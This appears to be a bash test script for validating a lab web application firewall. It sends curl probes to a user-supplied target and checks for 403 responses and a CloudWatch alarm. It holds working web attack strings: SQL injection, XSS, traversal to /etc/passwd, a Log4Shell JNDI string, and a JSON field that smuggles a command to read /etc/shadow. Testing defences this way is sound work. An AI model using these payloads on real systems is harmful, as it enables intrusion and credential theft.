#!/usr/bin/env bash
set -euo pipefail

if [[ $# -ne 1 || "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
    echo "Usage: bash scripts/chaos_test.sh http://YOUR-LAB-ALB-HOSTNAME" >&2
    echo "Run only against your own deployed lab. Sends 25 command-injection probes." >&2
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        exit 0
    fi
    exit 2
fi

TARGET="${1%/}"
if [[ ! "$TARGET" =~ ^https?://[^/?#[:space:]]+$ ]]; then
    echo "Provide an HTTP(S) origin, without a path or query string." >&2
    exit 2
fi

command -v curl >/dev/null || { echo "curl is required" >&2; exit 1; }

# Do not follow redirects or normalize traversal payloads. Network errors must
# fail the test rather than appear as a successful request with HTTP 000.
request() {
    if ! STATUS=$(curl --silent --show-error --globoff --path-as-is \
        --connect-timeout 5 --max-time 15 --output /dev/null \
        --write-out '%{http_code}' "$@"); then
        echo "Request failed; check the URL, connectivity, and ECS health." >&2
        exit 1
    fi
}

probe() {
    local label="$1"
    shift
    request "$@"
    if [[ "$STATUS" == "403" ]]; then
        printf '%s: HTTP 403 (confirm the blocking rule in WAF logs)\n' "$label"
    else
        printf '%s: HTTP %s (not blocked with 403; review WAF logs/rules)\n' "$label" "$STATUS"
    fi
}

printf 'Testing lab: %s\n' "$TARGET"
request "$TARGET/"
if [[ "$STATUS" != "200" && "$STATUS" != "304" ]]; then
    printf 'Normal visit failed: HTTP %s\n' "$STATUS" >&2
    exit 1
fi
printf 'Normal visit: HTTP %s\n' "$STATUS"

# Informational probes: managed signatures can change; do not claim that WAF
# detects every payload. URL-encode queries and preserve traversal paths.
probe SQLi --get --data-urlencode "q=q' UNION SELECT 1,2,3,4,5 FROM Users--" \
    "$TARGET/rest/products/search"
probe XSS --get --data-urlencode "q=<script>alert('XSS')</script>" \
    "$TARGET/rest/products/search"
probe LFI "$TARGET/ftp/../../../../etc/passwd"
probe Log4Shell "$TARGET/" --header "User-Agent: \${jndi:ldap://example.invalid/x}"
probe BadUserAgent "$TARGET/" --header 'User-Agent: sqlmap'

# This payload matches Custom-Block-CMD in terraform/security.tf. A short burst exercises
# the >10 blocked requests / minute alarm, including across a minute boundary.
echo "Sending 25 custom-rule probes for the CloudWatch alarm..."
for ((i = 1; i <= 25; i++)); do
    request "$TARGET/api/Feedbacks" --header 'Content-Type: application/json' \
        --data '{"comment":"; cat /etc/shadow;","rating":5}'
    if [[ "$STATUS" != "403" ]]; then
        printf 'Custom rule failed on probe %s: expected 403, got %s\n' "$i" "$STATUS" >&2
        exit 1
    fi
done

echo "25/25 custom probes returned 403. Confirm Custom-Block-CMD in WAF logs."
echo "Allow a few minutes, then check CloudWatch alarm state history (see README)."
